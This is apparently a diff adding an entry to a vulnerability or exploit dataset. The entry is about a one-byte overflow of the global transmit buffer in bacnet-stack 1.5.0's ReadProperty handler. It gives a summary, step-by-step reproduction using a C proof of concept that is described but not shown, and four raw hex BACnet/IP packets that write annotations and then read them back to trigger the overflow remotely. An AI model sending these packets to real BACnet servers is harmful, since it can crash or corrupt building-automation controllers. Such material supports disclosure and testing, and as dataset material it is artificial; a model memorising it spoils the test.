@@ -1,0 +1,13 @@
+Number: 1398
+
+Summarize:
+In bacnet-stack 1.5.0 (master branch commit 932e347), handler_read_property() constructs a ReadProperty-ACK without reserving space for the final closing tag in Handler_Transmit_Buffer. On the OBJECT_STRUCTURED_VIEW / PROP_SUBORDINATE_ANNOTATIONS path (handler_read_property() -> Device_Read_Property() -> Structured_View_Read_Property() -> bacnet_array_encode()), if the encoded property-value length exactly equals rpdata.application_data_len, handler_read_property() still calls rp_ack_encode_apdu_object_property_end(), and the resulting encode_closing_tag() writes 1 byte immediately past the end of the global Handler_Transmit_Buffer. The document states this is remotely reachable through the normal BACnet server path on a server that exposes ReadProperty and WriteProperty and has a writable Structured View object, by modifying PROP_SUBORDINATE_ANNOTATIONS and then issuing ReadProperty(..., BACNET_ARRAY_ALL).
+
+Reproduce:
+Target a bacnet-stack 1.5.0 server (master commit 932e347) that exposes ReadProperty and WriteProperty and has a writable OBJECT_STRUCTURED_VIEW. The supplied C PoC takes <device-instance> <structured-view-instance> as arguments; the source shows example arguments 260001 1, and its request summary uses OBJECT_STRUCTURED_VIEW instance 1. The PoC initializes the BACnet client/datalink, sends Who-Is, binds to the target via I-Am, and uses a fixed layout of 742 annotations (741 empty entries and a final "BBBB"). Then, waiting for each ACK, send these requests in order: 1) Write PROP_SUBORDINATE_ANNOTATIONS[0] = 0; 2) Write PROP_SUBORDINATE_ANNOTATIONS[0] = 742; 3) Write PROP_SUBORDINATE_ANNOTATIONS[742] = "BBBB"; 4) ReadProperty(OBJECT_STRUCTURED_VIEW, 1, PROP_SUBORDINATE_ANNOTATIONS, BACNET_ARRAY_ALL) in the documented example. The PoC waits up to 10 seconds for results. If a ReadProperty-ACK is received, it reports that the bug did not trigger on that run; if an error/abort/reject is returned, it reports failure; if no ReadProperty-ACK arrives before timeout, it prints that the target likely crashed before completing the ACK path.
+
+Payload:
+81 0a 00 17 01 04 00 05 01 0f 0c 07 40 00 01 19 d2 29 00 3e 21 00 3f
+81 0a 00 18 01 04 00 05 02 0f 0c 07 40 00 01 19 d2 29 00 3e 22 02 e6 3f
+81 0a 00 1d 01 04 00 05 03 0f 0c 07 40 00 01 19 d2 2a 02 e6 3e 75 05 00 42 42 42 42 3f
+81 0a 00 11 01 04 00 05 04 0c 0c 07 40 00 01 19 d2
